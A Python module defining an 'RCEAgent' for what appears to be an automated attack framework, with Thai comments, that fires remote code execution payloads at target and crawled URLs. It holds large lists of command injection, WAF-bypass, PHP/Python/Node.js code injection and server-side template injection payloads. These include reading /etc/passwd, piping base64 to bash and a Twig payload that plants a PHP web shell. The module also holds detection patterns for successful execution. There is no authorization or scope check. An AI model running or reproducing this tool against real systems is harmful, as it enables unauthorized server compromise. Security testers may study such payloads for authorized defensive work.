"""
RCEAgent - Remote Code Execution Master
โจมตี RCE ผ่าน Command Injection, Code Injection, และ SSTI
"""

import asyncio
import hashlib
import os
import re
import base64
from typing import Dict, List, Any, Optional, Tuple
from urllib.parse import urljoin, urlparse, quote, urlencode
import aiohttp

from core.base_agent import BaseAgent
from core.data_models import AgentData, AttackPhase, Strategy
from core.logger import log


class RCEAgent(BaseAgent):
    """
    Remote Code Execution Master Agent
    
    Features:
    - Command injection (shell metacharacters)
    - Code injection (PHP, Python, JavaScript)
    - Server-Side Template Injection (SSTI)
    - Blind RCE detection via time delays
    - Out-of-band detection (DNS, HTTP callbacks)
    - OS-specific payloads
    - WAF bypass techniques
    - Reverse/bind shell establishment
    """
    
    supported_phases = [AttackPhase.EXPLOITATION]
    required_tools = []

    def __init__(self, context_manager=None, orchestrator=None, **kwargs):
        super().__init__(context_manager, orchestrator, **kwargs)
        self.results_dir = "workspace/loot/rce"
        os.makedirs(self.results_dir, exist_ok=True)
        
        self.callback_server = kwargs.get('callback_server', 'auto')
        self.command_injection = kwargs.get('command_injection', True)
        self.code_injection = kwargs.get('code_injection', True)
        self.template_injection = kwargs.get('template_injection', True)
        
        self.vulnerabilities_found = []
        
    def _load_command_injection_payloads(self) -> Dict[str, List[str]]:
        """โหลด command injection payloads"""
        return {
            'basic': [
                # Semicolon separator
                '; whoami',
                '; id',
                '; uname -a',
                
                # Pipe
                '| whoami',
                '| id',
                '| uname -a',
                
                # AND
                '&& whoami',
                '&& id',
                '&& uname -a',
                
                # OR
                '|| whoami',
                '|| id',
                '|| uname -a',
                
                # Backticks
                '`whoami`',
                '`id`',
                '`uname -a`',
                
                # $() syntax
                '$(whoami)',
                '$(id)',
                '$(uname -a)',
                
                # Newline
                '%0awhoami',
                '%0aid',
                '\nwhoami',
                '\nid',
            ],
            
            'blind_time': [
                # Linux sleep
                '; sleep 10',
                '& sleep 10',
                '| sleep 10',
                '|| sleep 10 ||',
                '&& sleep 10 &&',
                '`sleep 10`',
                '$(sleep 10)',
                
                # Windows timeout
                '; timeout /t 10',
                '& timeout /t 10',
                '| timeout /t 10',
                
                # Ping-based delay
                '| ping -c 10 127.0.0.1',
                '& ping -n 10 127.0.0.1',
            ],
            
            'waf_bypass': [
                # Space bypass
                ';who${IFS}ami',
                ';who$IFS$9ami',
                ';who$IFS()ami',
                ';who${IFS%??}ami',
                ';who\\tami',
                ';cat${IFS}/etc/passwd',
                ';cat$IFS/etc/passwd',
                ';cat</etc/passwd',
                
                # Case manipulation
                ';WhoAmI',
                ';WHOAMI',
                
                # Wildcards
                ';who*ami',
                ';who?ami',
                ';/usr/bin/who*ami',
                ';/???/???/who*ami',
                
                # Concatenation
                ';who\\ami',
                ';who""ami',
                ";who''ami",
                ';who$@ami',
                
                # Encoding
                ';who\\x61mi',  # hex
                ';$(printf "\\x77\\x68\\x6f\\x61\\x6d\\x69")',
                
                # Base64
                ';echo d2hvYW1p|base64 -d|bash',
                
                # Reverse
                ';`rev<<<imaohw`',
            ],
            
            'windows': [
                '& whoami',
                '| whoami',
                '&& whoami',
                '|| whoami',
                '; whoami',
                '%0a whoami',
                
                # PowerShell
                '; powershell -c whoami',
                '& powershell -c "whoami"',
                '| powershell IEX(whoami)',
                
                # CMD bypass
                '& c^m^d /c whoami',
                '& c""md /c whoami',
            ],
        }
    
    def _load_code_injection_payloads(self) -> Dict[str, List[str]]:
        """โหลด code injection payloads"""
        return {
            'php': [
                # Basic eval
                'system("whoami")',
                'shell_exec("whoami")',
                'exec("whoami")',
                'passthru("whoami")',
                '`whoami`',
                
                # With semicolons
                ';system("whoami");',
                ';shell_exec("whoami");',
                ';passthru("whoami");',
                
                # With PHP tags
                '<?php system("whoami"); ?>',
                '<?php echo shell_exec("whoami"); ?>',
                '<?=`whoami`?>',
                
                # preg_replace /e modifier (older PHP)
                'preg_replace("/test/e", "system(\'whoami\')", "test")',
                
                # assert
                'assert(system("whoami"))',
                
                # Obfuscated
                '${system("whoami")}',
                '{${system("whoami")}}',
                
                # Variable functions
                '$_GET[0]($_GET[1])',  # ?0=system&1=whoami
            ],
            
            'python': [
                # Basic exec/eval
                '__import__("os").system("whoami")',
                'exec("import os;os.system(\'whoami\')")',
                'eval("__import__(\'os\').system(\'whoami\')")',
                
                # With semicolons
                ';__import__("os").system("whoami")',
                
                # subprocess
                '__import__("subprocess").call("whoami",shell=True)',
                '__import__("subprocess").check_output("whoami",shell=True)',
                
                # Obfuscated
                '__import__("os").popen("whoami").read()',
                'getattr(__import__("os"),"system")("whoami")',
                '__builtins__.__import__("os").system("whoami")',
            ],
            
            'javascript': [
                # Node.js require
                'require("child_process").exec("whoami")',
                'require("child_process").execSync("whoami").toString()',
                'require("child_process").spawn("whoami")',
                
                # With global
                'global.process.mainModule.require("child_process").exec("whoami")',
                
                # With constructor
                'this.constructor.constructor("return process")().mainModule.require("child_process").execSync("whoami")',
            ],
        }
    
    def _load_ssti_payloads(self) -> Dict[str, List[str]]:
        """โหลด Server-Side Template Injection payloads"""
        return {
            'jinja2': [
                # Python/Flask - Jinja2
                '{{7*7}}',  # Test
                '{{config}}',
                '{{config.items()}}',
                "{{''.__class__.__mro__[1].__subclasses__()}}",
                "{{''.__class__.__mro__[1].__subclasses__()[396]('whoami',shell=True,stdout=-1).communicate()}}",
                "{{config.__class__.__init__.__globals__['os'].popen('whoami').read()}}",
                "{{request.application.__globals__.__builtins__.__import__('os').popen('whoami').read()}}",
                "{{''.__class__.__bases__[0].__subclasses__()[59].__init__.__globals__['__builtins__']['eval']('__import__(\"os\").popen(\"whoami\").read()')}}",
                
                # Jinja2 filters
                "{{''.join([])}}",
                "{{request|attr('application')|attr('\\x5f\\x5fglobals\\x5f\\x5f')|attr('\\x5f\\x5fgetitem\\x5f\\x5f')('\\x5f\\x5fbuiltins\\x5f\\x5f')|attr('\\x5f\\x5fgetitem\\x5f\\x5f')('\\x5f\\x5fimport\\x5f\\x5f')('os')|attr('popen')('whoami')|attr('read')()}}",
            ],
            
            'twig': [
                # PHP/Symfony - Twig
                '{{7*7}}',  # Test
                '{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("whoami")}}',
                '{{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("whoami")}}',
                '{{["whoami"]|filter("system")}}',
                '{{["id"]|map("system")|join}}',
                "{{{'<?php system($_GET[\"cmd\"]);?>':'/var/www/html/shell.php'}|map('file_put_contents')}}",
            ],
            
            'freemarker': [
                # Java - Freemarker
                '${7*7}',  # Test
                '<#assign ex="freemarker.template.utility.Execute"?new()> ${ex("whoami")}',
                '<#assign classloader=object?api.class.getClassLoader()>',
                '${classloader.loadClass("java.lang.Runtime")}',
                '<#assign runtime=classloader.loadClass("java.lang.Runtime")>',
                '${runtime.getRuntime().exec("whoami")}',
            ],
            
            'velocity': [
                # Java - Velocity
                '${"7"*7}',  # Test (will output 7777777)
                '#set($str=$class.inspect("java.lang.String").type)',
                '#set($chr=$class.inspect("java.lang.Character").type)',
                '#set($ex=$class.inspect("java.lang.Runtime").type.getRuntime().exec("whoami"))',
                '$ex.waitFor()',
                '#set($out=$ex.getInputStream())',
                
                # ClassLoader method
                '#set($engine=$class.inspect("javax.script.ScriptEngineManager").type)',
                '#set($manager=$engine.newInstance())',
                '#set($js=$manager.getEngineByName("JavaScript"))',
                '$js.eval("java.lang.Runtime.getRuntime().exec(\'whoami\')")',
            ],
            
            'erb': [
                # Ruby - ERB
                '<%= 7*7 %>',  # Test
                '<%= system("whoami") %>',
                '<%= `whoami` %>',
                '<%= IO.popen("whoami").readlines() %>',
                '<%= File.open("/etc/passwd").read %>',
                '<%= Dir.entries("/") %>',
            ],
            
            'handlebars': [
                # Node.js - Handlebars
                '{{#with "s" as |string|}}{{#with "e"}}{{#with split as |conslist|}}{{this.pop}}{{this.push (lookup string.sub "constructor")}}{{this.pop}}{{#with string.split as |codelist|}}{{this.pop}}{{this.push "return require(\'child_process\').exec(\'whoami\');"}}{{this.pop}}{{#each conslist}}{{#with (string.sub.apply 0 codelist)}}{{this}}{{/with}}{{/each}}{{/with}}{{/with}}{{/with}}{{/with}}',
            ],
        }
    
    async def _test_command_injection(
        self, 
        url: str, 
        param: str, 
        original_value: str
    ) -> List[Dict[str, Any]]:
        """ทดสอบ command injection"""
        found_vulns = []
        payloads = self._load_command_injection_payloads()
        
        try:
            async with aiohttp.ClientSession() as session:
                # Test basic payloads
                for category, payload_list in payloads.items():
                    if category == 'blind_time':
                        # Test time-based blind injection
                        for payload in payload_list[:3]:  # Test first 3
                            test_value = original_value + payload
                            test_url = url.replace(f'{param}={original_value}', f'{param}={quote(test_value)}')
                            
                            import time
                            start_time = time.time()
                            
                            try:
                                async with session.get(test_url, timeout=15) as response:
                                    await response.text()
                                
                                elapsed = time.time() - start_time
                                
                                # If response took ~10 seconds, likely vulnerable
                                if 8 < elapsed < 12:
                                    vuln = {
                                        'type': 'blind_command_injection',
                                        'url': test_url,
                                        'parameter': param,
                                        'payload': payload,
                                        'evidence': f'Response time: {elapsed:.2f}s (expected ~10s)',
                                        'severity': 'critical'
                                    }
                                    found_vulns.append(vuln)
                                    log.success(f"[RCEAgent] ✓ BLIND RCE: {param} - Time delay detected")
                                    
                            except asyncio.TimeoutError:
                                # Timeout might indicate successful sleep
                                vuln = {
                                    'type': 'blind_command_injection',
                                    'url': test_url,
                                    'parameter': param,
                                    'payload': payload,
                                    'evidence': 'Request timeout (15s)',
                                    'severity': 'critical'
                                }
                                found_vulns.append(vuln)
                            except:
                                pass
                            
                            await asyncio.sleep(0.5)
                    
                    else:
                        # Test direct command injection
                        for payload in payload_list[:10]:  # Test first 10 per category
                            test_value = original_value + payload
                            test_url = url.replace(f'{param}={original_value}', f'{param}={quote(test_value)}')
                            
                            try:
                                async with session.get(test_url, timeout=10) as response:
                                    response_text = await response.text()
                                    
                                    # Look for command output indicators
                                    indicators = [
                                        r'root:',  # /etc/passwd
                                        r'uid=\d+',  # id command
                                        r'Linux.*\d+\.\d+',  # uname -a
                                        r'www-data',
                                        r'apache',
                                        r'nginx',
                                        r'NT AUTHORITY',  # Windows
                                        r'C:\\Windows',
                                    ]
                                    
                                    for indicator in indicators:
                                        if re.search(indicator, response_text, re.IGNORECASE):
                                            vuln = {
                                                'type': 'command_injection',
                                                'url': test_url,
                                                'parameter': param,
                                                'payload': payload,
                                                'evidence': f'Matched pattern: {indicator}',
                                                'response_snippet': response_text[:500],
                                                'severity': 'critical'
                                            }
                                            found_vulns.append(vuln)
                                            log.success(f"[RCEAgent] ✓ COMMAND INJECTION: {param} - {payload[:30]}")
                                            break
                                    
                            except Exception as e:
                                pass
                            
                            await asyncio.sleep(0.3)
                
        except Exception as e:
            log.error(f"[RCEAgent] Error testing command injection: {e}")
        
        return found_vulns
    
    async def _test_code_injection(
        self, 
        url: str, 
        param: str, 
        original_value: str
    ) -> List[Dict[str, Any]]:
        """ทดสอบ code injection"""
        found_vulns = []
        payloads = self._load_code_injection_payloads()
        
        try:
            async with aiohttp.ClientSession() as session:
                for language, payload_list in payloads.items():
                    for payload in payload_list[:8]:  # Test first 8 per language
                        test_value = payload
                        test_url = url.replace(f'{param}={original_value}', f'{param}={quote(test_value)}')
                        
                        try:
                            async with session.get(test_url, timeout=10) as response:
                                response_text = await response.text()
                                
                                # Look for successful code execution
                                indicators = [
                                    r'root:',
                                    r'uid=\d+',
                                    r'www-data',
                                    r'apache',
                                    r'NT AUTHORITY',
                                ]
                                
                                for indicator in indicators:
                                    if re.search(indicator, response_text, re.IGNORECASE):
                                        vuln = {
                                            'type': f'{language}_code_injection',
                                            'url': test_url,
                                            'parameter': param,
                                            'payload': payload,
                                            'evidence': f'Matched pattern: {indicator}',
                                            'response_snippet': response_text[:500],
                                            'severity': 'critical'
                                        }
                                        found_vulns.append(vuln)
                                        log.success(f"[RCEAgent] ✓ {language.upper()} CODE INJECTION: {param}")
                                        break
                                
                        except Exception as e:
                            pass
                        
                        await asyncio.sleep(0.3)
                
        except Exception as e:
            log.error(f"[RCEAgent] Error testing code injection: {e}")
        
        return found_vulns
    
    async def _test_ssti(
        self, 
        url: str, 
        param: str, 
        original_value: str
    ) -> List[Dict[str, Any]]:
        """ทดสอบ Server-Side Template Injection"""
        found_vulns = []
        payloads = self._load_ssti_payloads()
        
        try:
            async with aiohttp.ClientSession() as session:
                # Test basic math first to identify template engine
                test_payloads = [
                    ('{{7*7}}', '49', 'jinja2/twig'),
                    ('${7*7}', '49', 'freemarker'),
                    ('<%= 7*7 %>', '49', 'erb'),
                    ('${"7"*7}', '7777777', 'velocity'),
                ]
                
                detected_engine = None
                
                for test_payload, expected, engine in test_payloads:
                    test_url = url.replace(f'{param}={original_value}', f'{param}={quote(test_payload)}')
                    
                    try:
                        async with session.get(test_url, timeout=10) as response:
                            response_text = await response.text()
                            
                            if expected in response_text:
                                detected_engine = engine
                                log.success(f"[RCEAgent] ✓ SSTI DETECTED: {engine} template engine")
                                break
                    except:
                        pass
                    
                    await asyncio.sleep(0.3)
                
                # If engine detected, test RCE payloads for that engine
                if detected_engine:
                    engine_key = detected_engine.split('/')[0]
                    if engine_key in payloads:
                        for payload in payloads[engine_key][1:]:  # Skip test payload
                            test_url = url.replace(f'{param}={original_value}', f'{param}={quote(payload)}')
                            
                            try:
                                async with session.get(test_url, timeout=10) as response:
                                    response_text = await response.text()
                                    
                                    # Look for RCE indicators
                                    if any(indicator in response_text.lower() for indicator in ['root:', 'uid=', 'www-data', 'apache']):
                                        vuln = {
                                            'type': 'ssti_rce',
                                            'url': test_url,
                                            'parameter': param,
                                            'template_engine': detected_engine,
                                            'payload': payload,
                                            'evidence': 'Command execution successful',
                                            'response_snippet': response_text[:500],
                                            'severity': 'critical'
                                        }
                                        found_vulns.append(vuln)
                                        log.success(f"[RCEAgent] ✓ SSTI RCE: {detected_engine}")
                                        break
                            except:
                                pass
                            
                            await asyncio.sleep(0.3)
                
        except Exception as e:
            log.error(f"[RCEAgent] Error testing SSTI: {e}")
        
        return found_vulns
    
    async def _discover_parameters(self, url: str) -> List[Tuple[str, str]]:
        """ค้นหา parameters ที่น่าสนใจ"""
        params = []
        
        # Parse existing parameters
        from urllib.parse import parse_qs
        parsed = urlparse(url)
        query_params = parse_qs(parsed.query)
        
        for param, values in query_params.items():
            if values:
                params.append((param, values[0]))
        
        # Common vulnerable parameter names
        common_params = [
            'cmd', 'exec', 'command', 'execute', 'ping', 'query',
            'ip', 'host', 'url', 'file', 'path', 'folder', 'dir',
            'page', 'template', 'debug', 'eval', 'code', 'run',
        ]
        
        # Add common params if not present
        for param in common_params:
            if param not in [p[0] for p in params]:
                params.append((param, 'test'))
        
        return params
    
    async def run(self, strategy: Strategy = None, **kwargs) -> AgentData:
        """Execute RCE exploitation"""
        log.info("[RCEAgent] Starting RCE exploitation...")
        
        try:
            # Get target URL
            target_url = await self.context_manager.get_context('target_url') if self.context_manager else kwargs.get('target_url')
            
            if not target_url:
                return self.create_report(
                    summary="No target URL provided",
                    errors=["Target URL is required"]
                )
            
            # Get crawled URLs if available
            crawled_urls = []
            if self.context_manager:
                crawled_urls = await self.context_manager.get_context('crawled_urls') or []
            
            # Add base target URL
            test_urls = [target_url] + list(crawled_urls)[:50]  # Test up to 50 URLs
            
            log.info(f"[RCEAgent] Testing {len(test_urls)} URLs for RCE vulnerabilities")
            
            total_vulns = []
            
            for url in test_urls:
                # Discover parameters
                params = await self._discover_parameters(url)
                
                if not params:
                    continue
                
                log.info(f"[RCEAgent] Testing URL: {url}")
                
                for param, original_value in params:
                    # Test command injection
                    if self.command_injection:
                        vulns = await self._test_command_injection(url, param, original_value)
                        total_vulns.extend(vulns)
                    
                    # Test code injection
                    if self.code_injection:
                        vulns = await self._test_code_injection(url, param, original_value)
                        total_vulns.extend(vulns)
                    
                    # Test SSTI
                    if self.template_injection:
                        vulns = await self._test_ssti(url, param, original_value)
                        total_vulns.extend(vulns)
                    
                    await asyncio.sleep(0.2)
            
            # Save results
            if total_vulns:
                self._save_vulnerabilities(total_vulns)
                
                # Publish to PubSub
                if self.orchestrator and hasattr(self.orchestrator, 'pubsub_manager'):
                    for vuln in total_vulns:
                        await self.orchestrator.pubsub_manager.publish('rce_vulnerability', vuln)
            
            # Generate report
            summary = f"RCE testing complete. Found {len(total_vulns)} vulnerabilities across {len(test_urls)} URLs."
            log.success(f"[RCEAgent] {summary}")
            
            return self.create_report(
                summary=summary,
                vulnerabilities=total_vulns,
                total_vulns=len(total_vulns),
                urls_tested=len(test_urls)
            )
            
        except Exception as e:
            log.error(f"[RCEAgent] Error during execution: {e}", exc_info=True)
            return self.create_report(
                summary=f"RCE exploitation failed: {str(e)}",
                errors=[str(e)]
            )
    
    def _save_vulnerabilities(self, vulns: List[Dict[str, Any]]):
        """บันทึกช่องโหว่ที่พบ"""
        try:
            filename = f"rce_vulns_{hashlib.md5(str(len(vulns)).encode()).hexdigest()[:8]}.txt"
            filepath = os.path.join(self.results_dir, filename)
            
            with open(filepath, 'w') as f:
                f.write("=== RCE VULNERABILITIES FOUND ===\n\n")
                
                for i, vuln in enumerate(vulns, 1):
                    f.write(f"[{i}] {vuln['type'].upper()}\n")
                    f.write(f"URL: {vuln['url']}\n")
                    f.write(f"Parameter: {vuln.get('parameter', 'N/A')}\n")
                    f.write(f"Payload: {vuln['payload']}\n")
                    f.write(f"Evidence: {vuln['evidence']}\n")
                    f.write(f"Severity: {vuln['severity']}\n")
                    
                    if 'response_snippet' in vuln:
                        f.write(f"Response:\n{vuln['response_snippet']}\n")
                    
                    f.write("\n" + "="*80 + "\n\n")
            
            log.info(f"[RCEAgent] Vulnerabilities saved to: {filepath}")
            
        except Exception as e:
            log.error(f"[RCEAgent] Failed to save vulnerabilities: {e}")

